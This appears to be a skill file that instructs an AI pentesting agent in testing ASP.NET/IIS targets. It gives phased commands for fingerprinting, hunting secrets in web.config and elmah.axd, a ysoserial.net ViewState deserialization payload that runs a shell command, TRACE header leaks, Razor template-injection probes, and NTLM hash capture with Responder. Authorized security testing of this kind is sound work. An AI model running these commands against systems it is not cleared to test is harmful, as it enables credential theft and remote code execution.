---
name: framework-dotnet
description: "ASP.NET/Core security testing — ViewState deserialization, TRACE method info leak, Razor SSTI, Windows auth bypass, IIS misconfiguration, web.config exposure, machineKey extraction. Triggers: 'dotnet', 'asp.net', '.net framework', 'aspx', 'razor', 'iis security', 'viewstate', 'machinekey'."
---

# ASP.NET / .NET Core Security Testing

ASP.NET attack surface: ViewState, IIS config, Razor SSTI, machineKey, Windows auth.

## Phase 1: Fingerprinting

```bash
TARGET="https://TARGET"

# Detect ASP.NET
curl -sI "$TARGET" | grep -i "x-aspnet-version\|x-powered-by\|asp.net\|x-aspnetmvc-version"

# Check for .aspx endpoints
gobuster dir -u "$TARGET" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x aspx,ashx,asmx,svc,config -o /workspace/output/dotnet-endpoints.txt

# IIS default files
for f in web.config global.asax elmah.axd trace.axd ScriptResource.axd; do
  code=$(curl -so /dev/null -w "%{http_code}" "$TARGET/$f")
  echo "$code $f"
done | tee /workspace/output/iis-files.txt
```

## Phase 2: ViewState Deserialization

```bash
# Extract ViewState from page
curl -s "$TARGET/default.aspx" | grep -oP '__VIEWSTATE.*?value="\K[^"]+'

# Check if ViewState MAC validation disabled
# If no MAC = exploitable with ysoserial.net
# ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "cmd /c whoami > c:\windows\temp\pwned.txt"

# Check elmah.axd (error log exposure)
curl -s "$TARGET/elmah.axd" | grep -i "exception\|error\|stack"
```

## Phase 3: TRACE & Debug Methods

```bash
# TRACE method (can expose auth headers)
curl -X TRACE "$TARGET/" -H "Cookie: .ASPXAUTH=SESSION_TOKEN" -v

# Test OPTIONS
curl -X OPTIONS "$TARGET/" -v 2>&1 | grep "Allow:"

# Look for debug endpoints
for path in /trace.axd /WebResource.axd /ScriptResource.axd /_blazor/negotiate; do
  curl -so /dev/null -w "%{http_code} $path\n" "$TARGET$path"
done
```

## Phase 4: web.config Exposure

```bash
# Direct access attempts
for f in "web.config" "Web.config" "WEB.CONFIG" "web.config.bak" "web.config.old"; do
  curl -s "$TARGET/$f" | grep -i "connectionString\|machineKey\|appSettings"
done

# IIS short name enumeration (8.3 filenames)
# java -jar iis-shortname-scanner.jar 2 20 "$TARGET/"

# Razor page SSTI test
curl -s -X POST "$TARGET/render" -d "template=@(1+1)" | grep "^2$"
```

## Phase 5: Windows Auth / NTLM

```bash
# Detect NTLM auth
curl -sI "$TARGET/" | grep -i "www-authenticate\|negotiate\|ntlm"

# Capture NTLM hash with Responder (if internal)
# python3 Responder.py -I eth0 -wrf

# Test for NTLM relay opportunities
nmap -p 445 --script smb2-security-mode TARGET_IP
```

## Output

Save to `/workspace/output/`:
- `dotnet-endpoints.txt` — discovered .aspx/.asmx endpoints
- `iis-files.txt` — IIS sensitive file probes

## Next Phase

→ `vuln-deserialization` for ViewState/BinaryFormatter exploitation
→ `vuln-ssti` for Razor template injection
